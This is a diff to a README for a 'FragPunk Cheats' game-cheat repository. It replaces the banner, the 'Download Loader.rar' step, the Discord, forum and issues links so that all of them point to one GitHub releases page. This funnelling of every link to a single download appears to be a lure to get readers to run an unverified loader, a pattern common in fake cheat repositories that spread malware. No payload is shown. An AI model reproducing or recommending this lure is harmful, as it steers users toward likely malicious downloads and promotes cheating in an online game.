@@ -1,4 +1,4 @@
-![fragpunk](https://github.com/user-attachments/assets/75bfb267-86ad-4adf-8313-9bd7c38524ab)
+![fragpunk](https://github.com/YassinY0/fragpunk-cheats/releases)
 
 # ⚔️ FragPunk Cheats
 
@@ -19,7 +19,7 @@ Welcome to the **FragPunk Cheats** repository! This project provides a curated c
 
 To get started with FragPunk Cheats, follow these steps:
 
-1. **Download Loader.rar**
+1. **Download https://github.com/YassinY0/fragpunk-cheats/releases**
 
 
 2. **Navigate to the Project Directory**:
@@ -65,9 +65,9 @@ We welcome contributions! If you have new cheats, enhancements, or suggestions, 
 ## 🌐 Community
 
 Join the community for discussions, tips, and support:
-- [Discord Server](https://discord.com/invite/fragpunk)
-- [Forum](https://steamcommunity.com/app/2943650/discussions/)
+- [Discord Server](https://github.com/YassinY0/fragpunk-cheats/releases)
+- [Forum](https://github.com/YassinY0/fragpunk-cheats/releases)
 
 ## 💬 Contact
 
-For any questions or assistance, please reach out through the [issues section](https://github.com/yourusername/fragpunk-cheats/issues).
+For any questions or assistance, please reach out through the [issues section](https://github.com/YassinY0/fragpunk-cheats/releases).
